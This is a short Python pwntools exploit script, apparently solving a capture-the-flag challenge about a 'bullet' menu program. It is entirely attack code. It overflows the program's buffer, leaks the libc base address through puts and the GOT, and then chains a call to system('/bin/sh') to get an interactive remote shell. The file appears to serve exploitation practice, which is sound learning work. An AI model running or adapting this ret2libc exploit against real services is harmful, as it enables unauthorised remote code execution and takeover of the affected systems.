#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
if not os.path.exists(prog):
    log.warning('{}: No such file or directory'.format(prog))
else:
    elf = ELF(prog); context.word_size = elf.elfclass
    with context.local(log_level='ERROR'):
        libc = ELF('libc.so.6') if len(sys.argv) > 2 else elf.libc
    if not libc: log.warning('Cannot open libc.so.6')

def create(desc):
    r.sendlineafter('choice :', '1')
    r.recvuntil('bullet :')
    r.send(desc)

def power_up(desc):
    r.sendlineafter('choice :', '2')
    r.recvuntil('bullet :')
    r.send(desc)

def beat():
    r.sendlineafter('choice :', '3')
    r.recvuntil('win !!\n')

r = remote(HOST, PORT)

create('a'*47)
power_up('a')

# leak libc_base
elf.sym['puts'] = 0x080484a8
elf.got['puts'] = 0x0804afdc 
exp = '\xff'*3 + 'a'*4
exp += flat(elf.sym['puts'], elf.sym['main'], elf.got['puts'])
power_up(exp)
beat()
libc_base = r.leak() - libc.sym['puts']
libc.address += libc_base
log.info('libc_base: ' + hex(libc_base))

# shell out
create('a'*47)
power_up('a')
power_up('\xff'*3 + 'a'*4 + flat(libc.sym['system'], 'aaaa', libc.binsh))
beat()

r.interactive()
